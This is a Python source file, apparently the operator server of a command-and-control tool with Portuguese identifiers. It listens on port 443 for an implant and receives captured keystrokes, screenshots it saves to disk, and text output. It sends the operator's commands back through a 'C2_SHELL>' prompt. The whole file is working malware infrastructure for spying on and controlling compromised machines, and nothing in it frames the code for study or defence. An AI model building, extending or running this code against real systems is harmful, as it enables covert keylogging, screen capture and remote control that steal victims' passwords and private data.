import socket
import sys
import threading
import protocolo

LISTEN_IP = "0.0.0.0"
PORT = 443

def receive_handler(client_socket):
    while True:
        try:
            tipo, payload = protocolo.ler_mensagem(client_socket)
            
            if tipo == protocolo.MSG_TEXTO:
                print(f"\n[Texto]: {payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
                
            elif tipo == protocolo.MSG_KEYLOG:
                print(f"\n[Keylog]:\n{payload.decode('utf-8', errors='replace')}\nC2_SHELL> ", end="", flush=True)
                
            elif tipo == protocolo.MSG_IMAGEM:
                nome_arquivo = f"screenshot_{int(threading.get_ident())}.png"
                with open(nome_arquivo, "wb") as f:
                    f.write(payload)
                print(f"\n[+] Imagem salva como {nome_arquivo} ({len(payload)} bytes).\nC2_SHELL> ", end="", flush=True)
                
        except socket.timeout:
            continue
        except RuntimeError as e:
            print(f"\n[-] Conexão abortada: {e}")
            break
        except Exception as e:
            print(f"\n[!] Exceção inesperada: {type(e).__name__} - {e}")
            break

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {LISTEN_IP}:{PORT}...")
    except Exception as e:
        print(f"[!] Error binding to {LISTEN_IP}:{PORT}: {e}")
        sys.exit(1)
        
    try:
        client_socket, client_address = server.accept()
        print(f"[+] Connection established from {client_address[0]}:{client_address[1]}")
        
        client_socket.settimeout(1.0)
        
        recv_thread = threading.Thread(target=receive_handler, args=(client_socket,), daemon=True)
        recv_thread.start()
        
        while True:
            try:
                command = input("C2_SHELL> ").strip()
                if not command:
                    continue
                    
                protocolo.enviar_mensagem(client_socket, protocolo.MSG_TEXTO, command.encode())
                
                if command == "/exit":
                    print("[*] Closing connection.")
                    break
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Error: {type(e).__name__} - {e}")
                break
                    
    except KeyboardInterrupt:
        print("\n[*] Server stopping...")
    except Exception as e:
        print(f"\n[!] Server error: {type(e).__name__} - {e}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
